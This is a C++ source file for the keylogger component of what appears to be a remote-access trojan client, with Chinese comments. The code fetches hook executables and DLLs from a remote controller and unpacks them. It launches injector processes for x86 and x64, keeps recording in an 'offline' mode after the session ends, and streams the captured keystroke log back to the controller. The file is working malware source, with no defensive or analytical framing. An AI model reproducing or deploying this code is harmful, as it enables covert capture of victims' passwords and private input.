// KeybdLogger.cpp: implementation of the CKeybdLogger class.
//
//////////////////////////////////////////////////////////////////////

#include "KeybdLogger.h"
#include "unzip.h"

#include <STDIO.H>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

HANDLE CKeybdLogger::hBackgroundProcess_x64 = NULL;
DWORD CKeybdLogger::dwBackgroundThreadId_x64 = NULL;

HANDLE CKeybdLogger::hBackgroundProcess_x86 = NULL;
DWORD CKeybdLogger::dwBackgroundThreadId_x86 = NULL;

DWORD CKeybdLogger::dwSendSize = 0;

volatile long CKeybdLogger::mutex = 0;

BOOL CKeybdLogger::bOfflineRecord = FALSE;

TCHAR* plugs[] = {
	TEXT("x86.exe"),
	TEXT("hookdll_x86.dll"),

	TEXT("x64.exe"),
	TEXT("hookdll_x64.dll"),
};

CKeybdLogger::~CKeybdLogger()
{

}

CKeybdLogger::CKeybdLogger(CClient *pClient) :
CEventHandler(pClient, KBLG)
{
	
}

void CKeybdLogger::Lock()
{

	dbg_log("Enter CKeybdLogger::Lock()\n");
	
	while(InterlockedExchange(&mutex,1))
	{
		Sleep(100);
	}

	dbg_log("Leave CKeybdLogger::Lock()\n");
}
void CKeybdLogger::Unlock(){
	dbg_log("Enter CKeybdLogger::Unlock()\n");
	InterlockedExchange(&mutex,0);
	dbg_log("Leave CKeybdLogger::Unlock()\n");
}


BOOL CKeybdLogger::CheckFile(bool x64){
	TCHAR plugPath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(0), plugPath, MAX_PATH);

	TCHAR * p = plugPath + lstrlen(plugPath) - 1;

	while (p >= plugPath && *p != '\\')
	{
		--p;
	}

	if (p >= plugPath){
		++p;
		*p = '\0';
		lstrcat(p, TEXT("klog\\"));

		int cnt = 2;
		if (x64)
			cnt = 4;

		for (int i = 0; i < cnt; i++)
		{
			TCHAR szFileName[MAX_PATH];
			WIN32_FIND_DATA fd = { 0 };
			HANDLE hFile = INVALID_HANDLE_VALUE;
			lstrcpy(szFileName, plugPath);
			lstrcat(szFileName, plugs[i]);

			hFile = FindFirstFile(szFileName, &fd);
			if (hFile == INVALID_HANDLE_VALUE)
			{
				return FALSE;
			}
			FindClose(hFile);
		}
		return TRUE;
	}
	return FALSE;
}

void CKeybdLogger::GetPlugs()
{
	dbg_log("Not Found Plugs ,call CKeybdLogger::GetPlugs()\n");
	Send(KEYBD_LOG_GETPLUGS,0,0);
}

BOOL CKeybdLogger::IsX64(){
	typedef VOID(__stdcall *PGetNativeSystemInfo)(
		LPSYSTEM_INFO lpSystemInfo
		);
	SYSTEM_INFO sys_info = { 0 };
	PGetNativeSystemInfo GetNativeSystemInfo =
		(PGetNativeSystemInfo)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "GetNativeSystemInfo");
	if (GetNativeSystemInfo != NULL)
	{
		GetNativeSystemInfo(&sys_info);
		if (sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
			sys_info.wProcessorArchitecture == PROCESSOR_AMD_X8664 ||
			sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
		{
			return TRUE;
		}
	}
	return FALSE;
}

void CKeybdLogger::OnDeleteLog(){

	TCHAR logFileName[MAX_PATH];
	GetModuleFileName(GetModuleHandle(0), logFileName, MAX_PATH);

	TCHAR * p = logFileName + lstrlen(logFileName) - 1;

	while (p >= logFileName && *p != '\\'){
		--p;
	}
	if (p >= logFileName){
		++p;
		*p = '\0';
		lstrcat(p, TEXT("klog\\r.log"));
		DeleteFile(logFileName);
		dwSendSize = 0;
	}
}


BOOL CKeybdLogger::InstallX86Hook(){
	TCHAR plugPath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(0), plugPath, MAX_PATH);

	TCHAR * p = plugPath + lstrlen(plugPath) - 1;

	while (p >= plugPath && *p != '\\'){
		--p;
	}
	if (p >= plugPath){
		++p;
		*p = '\0';
		lstrcat(p, TEXT("klog\\"));
		TCHAR LaunchProg[MAX_PATH];
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };

		lstrcpy(LaunchProg, plugPath);
		lstrcat(LaunchProg, plugs[0]);
		//
		if (hBackgroundProcess_x86 == NULL)
		{
			if (CreateProcess(LaunchProg, NULL, 0, 0, 0, 0, 0, 0, &si, &pi))
			{
				CloseHandle(pi.hThread);
				dwBackgroundThreadId_x86 = pi.dwThreadId;
				hBackgroundProcess_x86 = pi.hProcess;
				return TRUE;
			}
			else
			{
				TCHAR szError[0x100];
				wsprintf(szError, TEXT("CreateProcess Failed with Error: %u"), GetLastError());
				return FALSE;
			}
		}
		else{
			return TRUE;
		}
	}
	return FALSE;
}

#include "utils.h"
#include <TlHelp32.h>

DWORD GetMainThreadIdByProcId(DWORD dwProcID)
{
	DWORD dwMainThreadID = 0;
	ULONGLONG ullMinCreateTime = MAXULONGLONG;

	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap != INVALID_HANDLE_VALUE) 
	{
		THREADENTRY32 th32;
		BOOL bOK = TRUE;

		th32.dwSize = sizeof(THREADENTRY32);
		
		for (bOK = Thread32First(hThreadSnap, &th32); 
			bOK;
			bOK = Thread32Next(hThreadSnap, &th32))
		{
			if (th32.th32OwnerProcessID == dwProcID) 
			{
				HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION,
					TRUE, th32.th32ThreadID);
			
				if (hThread) 
				{
					FILETIME afTimes[4] = { 0 };
					if (GetThreadTimes(
						hThread,
						&afTimes[0], 
						&afTimes[1], 
						&afTimes[2],
						&afTimes[3]))
					{
						ULONGLONG ullTest = afTimes[0].dwHighDateTime;
						ullTest <<= 32;
						ullTest |= afTimes[0].dwLowDateTime;

						if (ullTest && ullTest < ullMinCreateTime)
						{
							ullMinCreateTime = ullTest;
							dwMainThreadID = th32.th32ThreadID; // let it be main... :)
						}
					}
					CloseHandle(hThread);
				}
			}
		}
		CloseHandle(hThreadSnap);
	}
	return dwMainThreadID;
}

void CKeybdLogger::CheckOldProcess(){
	TCHAR szX86[] = TEXT("x86.exe");
	TCHAR szX64[] = TEXT("x64.exe");

	bool is_x64 = IsX64();

	
	DWORD x86 = getProcessId(szX86);

	//已经存在了...
	if (hBackgroundProcess_x86 == NULL && x86 != 0)
	{
		hBackgroundProcess_x86 = OpenProcess(PROCESS_TERMINATE, FALSE, x86);
		dwBackgroundThreadId_x86 = GetMainThreadIdByProcId(x86);

		bOfflineRecord = 1;			///离线状态是开启的....
	}

	if (is_x64)
	{
		DWORD x64 = getProcessId(szX64);
		if (hBackgroundProcess_x64 == NULL && x64 != 0)
		{
			hBackgroundProcess_x64 = OpenProcess(PROCESS_TERMINATE, FALSE, x64);
			dwBackgroundThreadId_x64 = GetMainThreadIdByProcId(x64);
		}
	}
}

BOOL CKeybdLogger::InstallX64Hook()
{
	TCHAR plugPath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(0), plugPath, MAX_PATH);

	TCHAR * p = plugPath + lstrlen(plugPath) - 1;

	while (p >= plugPath && *p != '\\'){
		--p;
	}
	if (p >= plugPath){
		++p;
		*p = '\0';
		lstrcat(p, TEXT("klog\\"));
		TCHAR LaunchProg[MAX_PATH];
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };

		lstrcpy(LaunchProg, plugPath);
		lstrcat(LaunchProg, plugs[2]);
		//
		if (hBackgroundProcess_x64 == NULL){
			if (CreateProcess(LaunchProg, NULL, 0, 0, 0, 0, 0, 0, &si, &pi)){
				CloseHandle(pi.hThread);
				dwBackgroundThreadId_x64 = pi.dwThreadId;
				hBackgroundProcess_x64 = pi.hProcess;
				return TRUE;
			}
			else{
				TCHAR szError[0x100];
				wsprintf(szError, TEXT("CreateProcess Failed with Error: %u"), GetLastError());
				return FALSE;
			}
		}
		else{
			return TRUE;
		}
	}
	return FALSE;
}

void CKeybdLogger::UnhookX86(){
	if (hBackgroundProcess_x86){
		//像线程发送退出信息
		DWORD dwRet = 0;
		PostThreadMessage(dwBackgroundThreadId_x86, EXIT_HOOK, 0, 0);
		dwBackgroundThreadId_x86 = NULL;

		dbg_log("wait for x86 inject exit!\n");
		dwRet = WaitForSingleObject(hBackgroundProcess_x86, 5000);
		if (dwRet == WAIT_TIMEOUT){
			dbg_log("process not exit self!");
			TerminateProcess(hBackgroundProcess_x86, 0);
		}
		CloseHandle(hBackgroundProcess_x86);
		hBackgroundProcess_x86 = NULL;
	}
}

void CKeybdLogger::UnhookX64(){
	if (hBackgroundProcess_x64){
		//像线程发送退出信息
		DWORD dwRet = 0;
		PostThreadMessage(dwBackgroundThreadId_x64, EXIT_HOOK, 0, 0);
		dwBackgroundThreadId_x64 = NULL;

		//等待进程退出
		dbg_log("wait for x64 inject exit!\n");
		dwRet = WaitForSingleObject(hBackgroundProcess_x64, 5000);
		if (dwRet == WAIT_TIMEOUT){
			dbg_log("process not exit self!");
			TerminateProcess(hBackgroundProcess_x64, 0);
		}
		CloseHandle(hBackgroundProcess_x64);
		hBackgroundProcess_x64 = NULL;
	}

}
void CKeybdLogger::OnOpen()
{
	bool x64 = IsX64();
	Lock();
	dwSendSize = 0;

	if (!CheckFile(x64))
	{		
		//如果没有文件的话就先下载....
		GetPlugs();
		goto Error;
	}
	//首先文件一定是存在的....
	CheckOldProcess();
	//
	InstallX86Hook();

	if (x64)
	{
		InstallX64Hook();
	}

	//Send init info
	Send(KEYBD_LOG_INITINFO,(char*)&bOfflineRecord,1);
Error:	
	Unlock();
}



void CKeybdLogger::ExitBackgroundProcess(){
	bool x64 = IsX64();
	UnhookX86();
	if (x64){
		UnhookX64();
	}
}
void CKeybdLogger::OnClose()
{
	//如果取消离线记录,就关掉这些进程.

	dbg_log("CKeybdLogger::OnClose()\n");
	Lock();
	if(bOfflineRecord == FALSE){
		dbg_log("Not Offline Keyboard Record,ExitBackProcess!\n");
		ExitBackgroundProcess();
	}else{
		dbg_log("offline mode enable!\n");
	}
	Unlock();
}
void CKeybdLogger::OnEvent(UINT32 e, BYTE *lpData, UINT32 Size)
{
	switch (e)
	{
	case KEYBD_LOG_GET_LOG:
		OnGetLog();	
		break;
	case KEYBD_LOG_SETOFFLINERCD:
		OnSetOfflineRecord(lpData[0]);
		break;
	case KEYBD_LOG_PLUGS:
		OnRecvPlug((char*)lpData, Size);
		break;
	case KEYBD_LOG_CLEAN:
		OnDeleteLog();
		break;
	}
}

void CKeybdLogger::OnRecvPlug(char* zipData, DWORD dwSize){

	HZIP hZip = OpenZip(zipData, dwSize, nullptr);
	if (!hZip){
		dbg_log("OpenZip Failed!\n");
		return;
	}
	ZIPENTRY temp = { 0 };
	GetZipItem(hZip, -1, &temp);
	int cnt = temp.index;

	TCHAR plugPath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(0), plugPath, MAX_PATH);

	TCHAR * p = plugPath + lstrlen(plugPath) - 1;

	while (p >= plugPath && *p != '\\'){
		--p;
	}
	if (p >= plugPath){
		++p;
		*p = '\0';
		lstrcat(p, TEXT("klog"));
		for (int i = 0; i < cnt; i++){
			TCHAR szPlug[MAX_PATH];
			ZIPENTRY entry = { 0 };
			GetZipItem(hZip, i, &entry);
			wsprintf(szPlug, TEXT("%s\\%s"), plugPath, entry.name);

			UnzipItem(hZip, i, szPlug);
		}
		CloseZip(hZip);
		
		//安装 hook .....
		InstallX86Hook();
		if (IsX64()){
			InstallX64Hook();
		}
		//Send init info
		Send(KEYBD_LOG_INITINFO, &bOfflineRecord, 1);
	}
}

void CKeybdLogger::OnGetLog()
{
	TCHAR logFileName[MAX_PATH];
	GetModuleFileName(GetModuleHandle(0), logFileName, MAX_PATH);

	TCHAR * p = logFileName + lstrlen(logFileName) - 1;

	while (p >= logFileName && *p != '\\'){
		--p;
	}
	if (p >= logFileName){
		++p;
		*p = '\0';
		lstrcat(p, TEXT("klog\\r.log"));
		Lock();
		HANDLE hLog = CreateFile(logFileName, GENERIC_READ, FILE_SHARE_WRITE, 
			0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hLog != INVALID_HANDLE_VALUE){
			DWORD dwSizeLow, dwSizeHi;
			DWORD dwRead = 0;
			DWORD dwLeft = 0;
			DWORD dwMsg = KEYBD_LOG_DATA_APPEND;
			dwSizeLow = GetFileSize(hLog, &dwSizeHi);
			dwLeft = dwSizeLow;

			if (dwSendSize == dwSizeLow){
				Unlock();
				CloseHandle(hLog);
				return;
			}

			if (dwSendSize > dwSizeLow){
				dwSendSize = 0;
				dwMsg = KEYBD_LOG_DATA_NEW;		//新的数据,要求对方重新显示....
			}

			dwLeft = dwSizeLow - dwSendSize;
			SetFilePointer(hLog, dwSendSize, NULL, FILE_BEGIN);
			BYTE * lpLog = new BYTE[dwLeft + 1];
			lpLog[dwLeft] = NULL;

			if (ReadFile(hLog, lpLog, dwLeft, &dwRead, 0))
			{
				lpLog[dwLeft] = 0;
				Send(dwMsg, lpLog, dwLeft + 1);
				dwSendSize += dwLeft;
			}
			delete[]lpLog;
			CloseHandle(hLog);
		}
		Unlock();
	}
}


void CKeybdLogger::OnSetOfflineRecord(bool bOffline)
{
	dbg_log("Set Offline Mode:%d\n", bOffline);
	Lock();
	bOfflineRecord = bOffline;
	Unlock();
}